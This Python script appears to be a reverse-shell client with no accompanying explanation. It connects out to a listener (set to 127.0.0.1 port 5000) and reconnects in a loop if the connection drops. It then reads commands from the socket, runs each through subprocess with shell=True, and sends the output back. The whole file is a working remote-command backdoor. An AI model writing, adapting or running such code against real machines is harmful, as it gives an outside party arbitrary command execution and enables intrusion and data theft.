import socket, time, subprocess
import threading
import _thread as thread
import sys

global stop, thread_lock, command_list
command_list = []
thread_lock = thread.allocate_lock()
stop = False

def input_collection(sock):
    global command_list, thread_lock, stop
    while (not(stop)):
        try:
            command = sock.recv(2048).decode()
            print(command)
            thread_lock.acquire()
            command_list.append(command)
            thread_lock.release()
        except:
            print("RECEIVE TIMED OUT..")
            pass

def execute_commands(sock):
    global command_list, thread_lock, stop
    while(not(stop)):
        try:
            time.sleep(1)
            command = None
            #Reads the command_list pipe, needs to obtain thread lock
            thread_lock.acquire()
            print(len(command_list))
            if (len(command_list) > 0):
                command = command_list.pop(0)
            thread_lock.release()

            if(command != None):
                response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                data = response.stdout.read() + response.stderr.read()
                print("response was: {}".format(data))
                sock.sendall(data)
        except:
            print("ERROR IN EXECUTE_COMMANDS FUNCTION")

HOST = '127.0.0.1'
PORT = 5000
retry = True
while(retry):
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((HOST,PORT))
        print("Connection successful...")
        receiver = threading.Thread(target=input_collection,args=(sock,))
        sender = threading.Thread(target=execute_commands,args=(sock,))
        receiver.start()
        sender.start()
        while(True):
            pass
        retry = False
    except:
        retry = True
        time.sleep(3)
        print("Connection Failed")
    finally:
        sock.close()